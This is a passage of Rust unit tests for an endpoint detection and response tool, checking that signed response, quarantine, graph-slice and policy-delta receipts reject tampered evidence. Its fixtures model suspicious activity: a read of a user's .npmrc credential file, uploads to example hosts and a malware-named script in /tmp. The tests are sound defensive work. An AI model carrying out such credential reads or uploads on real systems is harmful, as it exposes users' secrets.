        missing_rollback_status
            .evidence
            .retain(|item| item.key != "rollbackStatus");
        assert!(missing_rollback_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("rollback status evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_binds_execution_status_and_actor() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "ack.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://ack.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed local response outcome".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        )
        .with_control_correlation(Some(EndpointResponseControlCorrelation {
            response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
            delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
            target_kind: "endpoint".to_string(),
            target_id: "endpoint-1".to_string(),
            ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
            ack_status: "acknowledged".to_string(),
            resulting_state: Some("succeeded".to_string()),
        }));
        let keypair = hush_core::Keypair::from_seed(&[37u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 37,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseAcknowledgement
        );
        assert_eq!(
            receipt.decision.finding_id,
            Some(acknowledgement.acknowledgement_id)
        );
        assert_eq!(receipt.actor.agent_id.as_deref(), Some("operator:test"));
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "acknowledgedStatus"));
        assert!(receipt.evidence.iter().any(|item| item.key == "rootNodeId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "graphSliceId"));
        assert!(receipt.evidence.iter().any(|item| item.key == "note"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlResponseActionId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlDeliveryId"));
        assert!(receipt.evidence.iter().any(|item| {
            item.key == "controlAckTokenHash"
                && item.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && item.raw_value.is_none()
        }));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "controlAckStatus"));

        let mut mismatched_acknowledgement_id = receipt.clone();
        if let Some(acknowledgement_id_evidence) = mismatched_acknowledgement_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgementId")
        {
            *acknowledgement_id_evidence = EndpointReceiptEvidence::hashed(
                "acknowledgementId",
                "response_acknowledgement:other",
            );
        }
        assert!(mismatched_acknowledgement_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement id evidence hash"));

        let mut mismatched_acknowledged_status = receipt.clone();
        if let Some(status_evidence) = mismatched_acknowledged_status
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgedStatus")
        {
            *status_evidence = EndpointReceiptEvidence::hashed("acknowledgedStatus", "failed");
        }
        assert!(mismatched_acknowledged_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement status evidence hash"));

        let mut mismatched_acknowledged_by = receipt.clone();
        if let Some(acknowledged_by_evidence) = mismatched_acknowledged_by
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgedBy")
        {
            *acknowledged_by_evidence =
                EndpointReceiptEvidence::hashed("acknowledgedBy", "operator:other");
        }
        assert!(mismatched_acknowledged_by
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledged-by evidence hash"));

        let mut empty_note = receipt.clone();
        if let Some(note_evidence) = empty_note
            .evidence
            .iter_mut()
            .find(|item| item.key == "note")
        {
            *note_evidence = EndpointReceiptEvidence::hashed("note", "");
        }
        assert!(empty_note
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement note evidence"));

        let mut missing_control_target = receipt.clone();
        missing_control_target
            .evidence
            .retain(|item| item.key != "controlTargetId");
        assert!(missing_control_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement target id evidence"));

        let mut empty_control_ack_token = receipt.clone();
        if let Some(token_hash) = empty_control_ack_token
            .evidence
            .iter_mut()
            .find(|item| item.key == "controlAckTokenHash")
        {
            token_hash.value_hash = sha256(b"").to_hex_prefixed();
        }
        assert!(empty_control_ack_token
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement token hash"));

        let mut relabeled_control_target = receipt.clone();
        if let Some(control_target) = relabeled_control_target
            .evidence
            .iter_mut()
            .find(|item| item.key == "controlTargetId")
        {
            *control_target = EndpointReceiptEvidence::hashed("controlTargetId", "endpoint-other");
        }
        assert!(relabeled_control_target
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));

        let invalid_control_status_acknowledgement =
            EndpointResponseAcknowledgementReport::from_execution(
                &execution,
                "operator:test",
                Some("invalid control acknowledgement status".to_string()),
                execution.completed_at + chrono::Duration::seconds(6),
            )
            .with_control_correlation(Some(EndpointResponseControlCorrelation {
                response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
                delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
                target_kind: "endpoint".to_string(),
                target_id: "endpoint-1".to_string(),
                ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
                ack_status: "queued".to_string(),
                resulting_state: Some("queued".to_string()),
            }));
        let invalid_control_status_receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 137,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &invalid_control_status_acknowledgement,
                graph: &subgraph,
            },
        );
        assert!(invalid_control_status_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement status evidence"));

        let invalid_control_target_kind_acknowledgement =
            EndpointResponseAcknowledgementReport::from_execution(
                &execution,
                "operator:test",
                Some("invalid control acknowledgement target kind".to_string()),
                execution.completed_at + chrono::Duration::seconds(7),
            )
            .with_control_correlation(Some(EndpointResponseControlCorrelation {
                response_action_id: "11111111-1111-4111-8111-111111111111".to_string(),
                delivery_id: Some("22222222-2222-4222-8222-222222222222".to_string()),
                target_kind: "deployment".to_string(),
                target_id: "endpoint-1".to_string(),
                ack_token_hash: sha256(b"control-ack-token").to_hex_prefixed(),
                ack_status: "acknowledged".to_string(),
                resulting_state: Some("succeeded".to_string()),
            }));
        let invalid_control_target_kind_receipt =
            EndpointDecisionReceipt::for_response_acknowledgement(
                EndpointResponseAcknowledgementReceiptInput {
                    local_sequence: 138,
                    endpoint_id: "endpoint-1",
                    signer_identity: "local-edr:endpoint-1",
                    actor: response_actor("endpoint-1"),
                    policy: EndpointPolicySnapshot {
                        policy_version: "test-policy@1".to_string(),
                        policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                        policy_epoch: 7,
                    },
                    sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                    acknowledgement: &invalid_control_target_kind_acknowledgement,
                    graph: &subgraph,
                },
            );
        assert!(invalid_control_target_kind_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("control acknowledgement target kind evidence"));

        let mut mismatched_execution_id = receipt.clone();
        if let Some(execution_id_evidence) = mismatched_execution_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence =
                EndpointReceiptEvidence::hashed("executionId", "response_execution:other");
        }
        assert!(mismatched_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));

        let mut missing_execution_id = receipt.clone();
        missing_execution_id
            .evidence
            .retain(|item| item.key != "executionId");
        assert!(missing_execution_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence"));

        let mut missing_acknowledged_status = receipt;
        missing_acknowledged_status
            .evidence
            .retain(|item| item.key != "acknowledgedStatus");
        assert!(missing_acknowledged_status
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement status evidence"));
    }

    #[test]
    fn endpoint_collect_evidence_acknowledgement_receipt_rejects_effects() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "ack-effect.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://ack-effect.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed collect evidence".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 38,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));

        let mut injected_effect = receipt;
        injected_effect
            .evidence
            .push(EndpointReceiptEvidence::hashed(
                "acknowledgementEffect:effect:fake",
                "collect_evidence:fake_effect",
            ));
        if let Some(effect_count_evidence) = injected_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "1");
        }
        let response_action_id = response_action_id_from_signed_response_fields(
            injected_effect.graph.process_node_id.as_deref().unwrap(),
            injected_effect.graph.graph_slice_id.as_deref().unwrap(),
            &injected_effect.decision.action,
            injected_effect.decision.ttl_seconds.unwrap(),
        );
        let acknowledgement_id = response_acknowledgement_id_from_signed_evidence(
            &injected_effect.evidence,
            response_action_id.as_str(),
            injected_effect.decision.rollback_ref.as_deref().unwrap(),
            injected_effect.actor.agent_id.as_deref().unwrap(),
        )
        .unwrap();
        injected_effect.decision.finding_id = Some(acknowledgement_id.clone());
        if let Some(acknowledgement_id_evidence) = injected_effect
            .evidence
            .iter_mut()
            .find(|item| item.key == "acknowledgementId")
        {
            *acknowledgement_id_evidence =
                EndpointReceiptEvidence::hashed("acknowledgementId", acknowledgement_id);
        }
        assert!(injected_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("collect evidence acknowledgement effect evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_requires_effects_for_successful_non_collect() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-ack-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-ack-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-ack-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed quarantine".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 39,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::QuarantineFile
        );
        assert!(receipt.decision.passed);
        assert_eq!(acknowledgement.effects.len(), 1);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffectType:")));

        let mut missing_effect_type = receipt.clone();
        missing_effect_type
            .evidence
            .retain(|item| !item.key.starts_with("acknowledgementEffectType:"));
        assert!(missing_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect type evidence"));

        let mut mismatched_effect_type = receipt.clone();
        if let Some(effect_type_evidence) = mismatched_effect_type
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("acknowledgementEffectType:"))
        {
            let key = effect_type_evidence.key.clone();
            *effect_type_evidence = EndpointReceiptEvidence::hashed(key, "disable_persistence");
        }
        assert!(mismatched_effect_type
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect type evidence hash"));

        let mut dropped_effect_evidence = receipt;
        dropped_effect_evidence
            .evidence
            .retain(|item| !item.key.starts_with("acknowledgementEffect:"));
        if let Some(effect_count_evidence) = dropped_effect_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "effectCount")
        {
            *effect_count_evidence = EndpointReceiptEvidence::hashed("effectCount", "0");
        }
        assert!(dropped_effect_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement effect evidence"));
    }

    #[test]
    fn endpoint_response_acknowledgement_receipt_binds_effect_digest() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Write,
            path: "/tmp/clawdstrike-ack-effect-malware.sh".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let file_node_id = graph_recorder
            .graph()
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::File)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing file node"));
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&file_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::quarantine_file_execution(
            &file_node_id,
            &subgraph,
            600,
            "quarantine suspicious file",
        );
        let execution = EndpointResponseExecutionReport::quarantine_file(
            &plan,
            &subgraph,
            "/tmp/clawdstrike-ack-effect-malware.sh",
            "/tmp/clawdstrike-quarantine/clawdstrike-ack-effect-malware.sh.quarantine",
            "0xabc123",
            128,
        )
        .unwrap_or_else(|err| panic!("failed to build quarantine execution report: {err}"));
        let acknowledgement = EndpointResponseAcknowledgementReport::from_execution(
            &execution,
            "operator:test",
            Some("reviewed quarantine effect".to_string()),
            execution.completed_at + chrono::Duration::seconds(5),
        );
        let receipt = EndpointDecisionReceipt::for_response_acknowledgement(
            EndpointResponseAcknowledgementReceiptInput {
                local_sequence: 40,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                acknowledgement: &acknowledgement,
                graph: &subgraph,
            },
        );

        receipt.validate().unwrap();
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key.starts_with("acknowledgementEffect:")));

        let mut substituted_effect = receipt;
        if let Some(effect_evidence) = substituted_effect
            .evidence
            .iter_mut()
            .find(|item| item.key.starts_with("acknowledgementEffect:"))
        {
            let effect_key = effect_evidence.key.clone();
            *effect_evidence = EndpointReceiptEvidence::hashed(effect_key, "quarantine_file:other");
        }
        assert!(substituted_effect
            .validate()
            .unwrap_err()
            .to_string()
            .contains("acknowledgement execution id evidence hash"));
    }

    #[test]
    fn endpoint_response_execution_expiration_receipt_binds_ttl_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "expire.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://expire.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            1,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let expired =
            EndpointResponseExecutionReport::expired_from(&execution, execution.expires_at());
        let keypair = hush_core::Keypair::from_seed(&[19u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 19,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &expired,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(receipt.decision.finding_id, Some(expired.execution_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(1));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "executionStatus"));
    }

    #[test]
    fn endpoint_response_execution_cancellation_receipt_binds_reason_ttl_and_rollback() {
        let event = observation(EndpointEvent::NetworkFlow {
            host: "cancel.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://cancel.example/upload".to_string()),
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let plan = EndpointResponsePlan::collect_evidence_execution(
            &process_node_id,
            &subgraph,
            600,
            "collect evidence graph slice",
        );
        let execution = EndpointResponseExecutionReport::collect_evidence(&plan, &subgraph)
            .unwrap_or_else(|err| panic!("failed to collect evidence report: {err}"));
        let cancelled = EndpointResponseExecutionReport::cancelled_from(
            &execution,
            "operator closed the local response window",
            execution.completed_at + chrono::Duration::seconds(15),
        );
        let keypair = hush_core::Keypair::from_seed(&[23u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_response_execution(
            EndpointResponseExecutionReceiptInput {
                local_sequence: 23,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                actor: response_actor("endpoint-1"),
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                execution: &cancelled,
                graph: &subgraph,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::ResponseExecution
        );
        assert_eq!(receipt.decision.finding_id, Some(cancelled.execution_id));
        assert_eq!(
            receipt.decision.action,
            EndpointDecisionAction::CollectEvidence
        );
        assert!(!receipt.decision.passed);
        assert_eq!(
            receipt.decision.rollback_ref.as_deref(),
            Some(plan.rollback_ref.as_str())
        );
        assert_eq!(receipt.decision.ttl_seconds, Some(600));
        assert_eq!(
            receipt.decision.title.as_deref(),
            Some("Endpoint response action cancelled")
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "executionStatus"));
        assert!(receipt.evidence.iter().any(|item| item.key == "reason"));

        let mut relabeled_cancellation_id = receipt.clone();
        relabeled_cancellation_id.decision.finding_id =
            Some("response_execution_cancelled:other".to_string());
        if let Some(execution_id_evidence) = relabeled_cancellation_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "executionId")
        {
            *execution_id_evidence = EndpointReceiptEvidence::hashed(
                "executionId",
                "response_execution_cancelled:other",
            );
        }
        assert!(relabeled_cancellation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("execution id evidence hash"));
    }

    #[test]
    fn endpoint_graph_slice_receipt_binds_exported_subgraph() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut graph_recorder = CausalGraphRecorder::new();
        graph_recorder.record_observation(&event);
        let process_node_id = event.process.stable_node_id();
        let subgraph = graph_recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();
        let keypair = hush_core::Keypair::from_seed(&[17u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_graph_slice(EndpointGraphSliceReceiptInput {
                local_sequence: 16,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                root_node_id: &process_node_id,
                slice_kind: "causal_subgraph",
                graph: &subgraph,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::GraphSlice
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            receipt.graph.graph_slice_id.as_deref()
        );
        assert_eq!(
            receipt.graph.process_node_id.as_deref(),
            Some(process_node_id.as_str())
        );
        assert!(receipt.evidence.iter().any(|item| item.key == "sliceKind"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "contentHash"));

        let mut mismatched_content_hash = receipt.clone();
        if let Some(content_hash_evidence) = mismatched_content_hash
            .evidence
            .iter_mut()
            .find(|item| item.key == "contentHash")
        {
            *content_hash_evidence = EndpointReceiptEvidence::hashed("contentHash", "sha256:other");
        }
        assert!(mismatched_content_hash
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice content hash evidence hash"));

        let mut mismatched_root_evidence = receipt.clone();
        if let Some(root_node_evidence) = mismatched_root_evidence
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_evidence
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice root node evidence hash"));

        let mut mismatched_node_count = receipt.clone();
        if let Some(node_count_evidence) = mismatched_node_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "nodeCount")
        {
            *node_count_evidence = EndpointReceiptEvidence::hashed("nodeCount", "0");
        }
        assert!(mismatched_node_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice node count evidence hash"));

        let mut mismatched_root_reference = receipt.clone();
        mismatched_root_reference.graph.process_node_id = Some("node:other".to_string());
        if let Some(root_node_evidence) = mismatched_root_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "rootNodeId")
        {
            *root_node_evidence = EndpointReceiptEvidence::hashed("rootNodeId", "node:other");
        }
        assert!(mismatched_root_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice graph root reference"));

        let mut mismatched_graph_slice_reference = receipt.clone();
        mismatched_graph_slice_reference.graph.graph_slice_id =
            Some("graph_slice:other".to_string());
        if let Some(graph_slice_evidence) = mismatched_graph_slice_reference
            .evidence
            .iter_mut()
            .find(|item| item.key == "graphSliceId")
        {
            *graph_slice_evidence =
                EndpointReceiptEvidence::hashed("graphSliceId", "graph_slice:other");
        }
        assert!(mismatched_graph_slice_reference
            .validate()
            .unwrap_err()
            .to_string()
            .contains("graph slice graph slice reference"));
    }

    #[test]
    fn endpoint_policy_delta_receipt_binds_delta_artifact_and_graph() {
        let keypair = hush_core::Keypair::from_seed(&[31u8; 32]);
        let artifact_hash = sha256(b"policy-delta-artifact").to_hex_prefixed();
        let action = EndpointDecisionAction::Warn;
        let generated_at = "2026-05-17T12:00:00Z";
        let source_affected_identity_context = r#"[{"identityKind":"user","sourceNodeId":"node:user:alice","sourceNodeKind":"user","value":"alice"}]"#;
        let source_affected_tool_context = r#"[{"sourceNodeId":"node:tool:mcp.shell","toolCallId":"tool-call-1","toolName":"mcp.shell"}]"#;
        let policy_delta_id = endpoint_policy_delta_id(EndpointPolicyDeltaIdInput {
            endpoint_id: "endpoint-1",
            rule_id: "endpoint.policy_delta.test",
            action: &action,
            staged_detection_id: "staged_detection:test",
            stage: "audit",
            generated_at,
            simulation_id: "simulation:test",
            graph_slice_id: "graph_slice:test",
            root_node_id: "node:test",
            source_affected_identity_context,
            source_affected_tool_context,
        });
        let mut receipt =
            EndpointDecisionReceipt::for_policy_delta(EndpointPolicyDeltaReceiptInput {
                local_sequence: 31,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                operation: "generated",
                policy_delta_id: policy_delta_id.as_str(),
                staged_detection_id: "staged_detection:test",
                rule_id: "endpoint.policy_delta.test",
                stage: "audit",
                generated_at,
                action: action.clone(),
                artifact_hash: artifact_hash.as_str(),
                simulation_id: "simulation:test",
                graph_slice_id: "graph_slice:test",
                root_node_id: "node:test",
                source_affected_identity_context,
                source_affected_tool_context,
                cross_window_impact_hash: None,
                cross_window_recommendation_hash: None,
                previous_policy_hash: None,
                new_policy_hash: None,
                backup_path: None,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::PolicyDelta
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(policy_delta_id.as_str())
        );

        let previous_policy_hash = sha256(b"test-policy").to_hex_prefixed();
        let prepared_policy_hash = sha256(b"test-policy-v2").to_hex_prefixed();
        let prepared_receipt =
            EndpointDecisionReceipt::for_policy_delta(EndpointPolicyDeltaReceiptInput {
                local_sequence: 33,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@2".to_string(),
                    policy_hash: prepared_policy_hash.clone(),
